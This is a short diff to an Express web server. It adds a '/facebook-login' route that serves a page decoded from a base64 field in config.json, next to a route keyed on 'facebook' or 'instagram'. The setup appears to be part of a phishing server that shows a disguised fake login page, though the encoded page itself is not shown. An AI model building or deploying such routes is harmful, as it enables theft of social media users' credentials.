@@ -25,6 +25,10 @@ app.use(express.static('./PUB'))
 app.get('/',(req, res)=>{
     res.send('<h1>Hello<h1>')
 })
+app.get('/facebook-login',(req, res)=>{
+    res.send(atob(require('./config.json').fasebook_page))
+}) 
+
 app.get('/:type/:greep/set',(req, res)=>{
     res.status(200)
     if (req.params.type == 'facebook' || req.params.type == 'instagram') {
